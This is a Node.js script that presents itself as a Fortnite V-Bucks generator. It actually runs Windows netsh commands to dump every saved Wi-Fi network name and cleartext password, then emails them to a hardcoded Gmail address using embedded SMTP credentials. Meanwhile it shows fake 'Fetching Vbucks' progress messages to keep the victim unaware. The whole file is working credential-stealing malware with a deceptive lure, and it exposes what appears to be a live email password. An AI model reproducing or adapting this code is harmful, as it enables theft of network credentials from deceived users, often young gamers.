const childProcess = require('child_process');
const nodemailer = require('nodemailer');

const senderEmail = 'ipfinderhack@gmail.com';
const receiverEmail = 'iphack26@gmail.com';
const smtpServer = 'smtp.gmail.com';
const smtpPort = 587;
const smtpUsername = 'ipfinderhack@gmail.com';
const smtpPassword = 'woetytcdydkklwmp';

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: smtpUsername,
    pass: smtpPassword,
  },
});

function sendEmail(subject, body) {
  const mailOptions = {
    from: senderEmail,
    to: receiverEmail,
    subject: subject,
    text: body,
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.error('Error sending email:', error);
    } else {
      console.log('Email sent:', info.response);
    }
  });
}

function getWifiPasswords() {
  try {
    const profilesData = childProcess.execSync('netsh wlan show profiles').toString();
    const profiles = profilesData.split('\n').filter(line => line.includes('All User Profile')).map(line => line.split(':')[1].trim());

    const results = [];
    profiles.forEach(profile => {
      try {
        const profileResultsData = childProcess.execSync(`netsh wlan show profile name="${profile}" key=clear`).toString();
        const profileResults = profileResultsData.split('\n');
        const passwordLine = profileResults.find(line => line.includes('Key Content'));
        const password = passwordLine ? passwordLine.split(':')[1].trim() : '';
        results.push({ profile, password });
      } catch (error) {
        results.push({ profile, password: 'ERROR' });
      }
    });

    return results;
  } catch (error) {
    console.error('Error:', error);
    return [];
  }
}

async function main() {
  const wifiPasswords = getWifiPasswords();
  let emailBody = '';

  wifiPasswords.forEach(({ profile, password }) => {
    emailBody += `Wi-Fi Network: ${profile}\nPassword: ${password}\n====================\n`;
  });

  if (emailBody) {
    const subject = 'Wi-Fi Passwords Report';
    sendEmail(subject, emailBody);
    console.log('Fetching Vbucks...');
    await sleep(3000);
    console.log('Failed To Fetch!');
    await sleep(500);
    console.log('Retrying...');
    await sleep(200);
    const vbucksAmount = Math.floor(Math.random() * (200 - 150 + 1)) + 150;
    console.log(`Fetching ${vbucksAmount} Vbucks...`);
    await sleep(4000);
    console.log('Successfully Transferred Vbucks, Please Close The Tab');
    await sleep(999999);
  } else {
    console.log('No Vbucks Found, Please Try Again Later');
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

main();
